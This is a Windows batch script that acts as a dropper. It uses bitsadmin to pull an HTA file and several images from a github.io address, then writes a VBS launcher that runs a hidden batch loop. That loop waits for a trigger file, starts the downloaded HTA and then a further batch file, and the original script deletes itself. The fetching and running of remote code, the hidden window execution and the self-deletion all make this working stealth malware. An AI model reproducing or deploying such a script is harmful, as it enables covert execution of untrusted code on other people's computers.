@echo off
cd "%systemdrive%/documents and settings/%username%/Desktop"
md MASTERFOLDER
 echo.>"%USERPROFILE%\Desktop\MASTERFOLDER\passcheck.txt"
bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/htl.hta %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta
bitsadmin.exe /transfer "1" https://athdot.github.io/dwnld/1.jpg %USERPROFILE%\Desktop\MASTERFOLDER\1.jpg

bitsadmin.exe /transfer "2" https://athdot.github.io/dwnld/2.jpg %USERPROFILE%\Desktop\MASTERFOLDER\2.jpg

bitsadmin.exe /transfer "3" https://athdot.github.io/dwnld/3.jpg %USERPROFILE%\Desktop\MASTERFOLDER\3.jpg

bitsadmin.exe /transfer "4" https://athdot.github.io/dwnld/4.jpg %USERPROFILE%\Desktop\MASTERFOLDER\4.jpg

bitsadmin.exe /transfer "5" https://athdot.github.io/dwnld/5.jpg %USERPROFILE%\Desktop\MASTERFOLDER\5.jpg

bitsadmin.exe /transfer "6" https://athdot.github.io/dwnld/6.jpg %USERPROFILE%\Desktop\MASTERFOLDER\6.jpg

bitsadmin.exe /transfer "7" https://athdot.github.io/dwnld/7.jpg %USERPROFILE%\Desktop\MASTERFOLDER\7.jpg

bitsadmin.exe /transfer "8" https://athdot.github.io/dwnld/8.png %USERPROFILE%\Desktop\MASTERFOLDER\8.png

bitsadmin.exe /transfer "9" https://athdot.github.io/dwnld/9.gif %USERPROFILE%\Desktop\MASTERFOLDER\mor.gif

bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%\Desktop\MASTERFOLDER\trippymeme.jpg
bitsadmin.exe /transfer "Start.hta" https://athdot.github.io/dwnld/htl.hta %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta
@echo Set shell = WScript.CreateObject("Wscript.Shell")> invisible.vbs
@echo shell.Run("C:\Users\%USERNAME%\Desktop\invisible.bat"),0,true>> invisible.vbs
@echo @echo off> invisible.bat
@echo :start>> invisible.bat
@echo IF EXIST %USERPROFILE%\Downloads\activate.txt (>> invisible.bat
@echo start %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta>> invisible.bat
@echo goto :check>> invisible.bat
@echo ) ELSE (>> invisible.bat
@echo goto :start>> invisible.bat
@echo )>> invisible.bat
@echo :check>> invisible.bat
@echo IF EXIST %USERPROFILE%\Desktop\mains.bat (>> invisible.bat
@echo start %USERPROFILE%\Desktop\mains.bat>> invisible.bat
@echo exit>> invisible.bat
@echo )>> invisible.bat
@echo goto :check>> invisible.bat
start %USERPROFILE%\Desktop\invisible.vbs
(goto) 2>nul & del "%~f0"
exit
